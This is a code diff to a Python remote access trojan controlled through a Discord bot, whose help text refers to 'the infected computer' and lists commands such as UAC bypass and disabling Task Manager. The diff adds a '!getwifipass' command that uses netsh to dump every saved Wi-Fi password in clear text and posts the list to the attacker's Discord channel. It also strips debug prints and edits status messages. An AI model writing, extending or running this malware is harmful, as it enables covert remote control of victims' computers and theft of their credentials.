@@ -88,6 +88,7 @@ Availaible commands are :
 --> !website = open a website on the infected computer / syntax = "!website google.com" or "!website www.google.com"
 --> !distaskmgr = disable task manager(Admin rights are required)
 --> !enbtaskmgr = enable task manager(if disabled)(Admin rights are required)
+--> !getwifipass = get all the wifi passwords on the current device(Admin rights are required)
 """
 
 async def activity(client):
@@ -273,8 +274,6 @@ async def on_message(message):
             import win32gui
             def get_all_hwnd(hwnd,mouse):
                 def winEnumHandler(hwnd, ctx):
-                    if win32gui.IsWindowVisible(hwnd):
-                        print(win32gui.GetWindowText(hwnd))
                     if win32gui.GetWindowText(hwnd) == "Error":
                         win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
                         win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
@@ -471,7 +470,7 @@ async def on_message(message):
             if isAdmin():
                 await message.channel.send("Your already admin!")
             else:
-                await message.channel.send("attempting to get admin!")
+                await message.channel.send("attempting to getting admin!")
                 if message.content == "!uacbypass":
                     uncritproc()
                     test_str = sys.argv[0]
@@ -1377,8 +1376,6 @@ async def on_message(message):
                 time.sleep(1)
                 shel._running = False
                 result = str(shell().stdout.decode('CP437'))
-                print(result)
-                print(len(result))
                 if len(result) <= 5:
                     import winreg as reg
                     reg.CreateKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
@@ -1418,14 +1415,51 @@ async def on_message(message):
                     time.sleep(1)
                     shel._running = False
                     result = str(shell().stdout.decode('CP437'))
-                    print(result)
-                    print(len(result))
                     if len(result) <= 5:
                         await message.channel.send("[*] Command successfuly executed")  
                     else:
                         import winreg as reg
                         reg.DeleteKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
                         await message.channel.send("[*] Command successfuly executed")
+            else:
+                await message.channel.send("[*] This command requires admin privileges")
+        if message.content == "!getwifipass":
+            import ctypes
+            import os
+            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+            if is_admin == True:
+                import ctypes
+                import os
+                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+                if is_admin == True:
+                    import os
+                    import subprocess
+                    import json
+                    x = subprocess.run("NETSH WLAN SHOW PROFILE", stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE).stdout.decode('CP437')
+                    x = x[x.find("User profiles\r\n-------------\r\n")+len("User profiles\r\n-------------\r\n"):len(x)].replace('\r\n\r\n"',"").replace('All User Profile', r'"All User Profile"')[4:]
+                    lst = []
+                    done = []
+                    for i in x.splitlines():
+                        i = i.replace('"All User Profile"     : ',"")
+                        b = -1
+                        while True:
+                            b = b + 1
+                            if i.startswith(" "):
+                                i = i[1:]
+                            if b >= len(i):
+                                break
+                        lst.append(i)
+                    lst.remove('')
+                    for e in lst:
+                        output = subprocess.run('NETSH WLAN SHOW PROFILE "' + e + '" KEY=CLEAR ', stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE).stdout.decode('CP437')
+                        for i in output.splitlines():
+                            if i.find("Key Content") != -1:
+                                ok = i[4:].replace("Key Content            : ","")
+                                break
+                        almoast = '"' + e + '"' + ":" + '"' + ok + '"'
+                        done.append(almoast)
+                    await message.channel.send("[*] Command successfuly executed")  
+                    await message.channel.send(done)
             else:
                 await message.channel.send("[*] This command requires admin privileges")
 client.run(token)
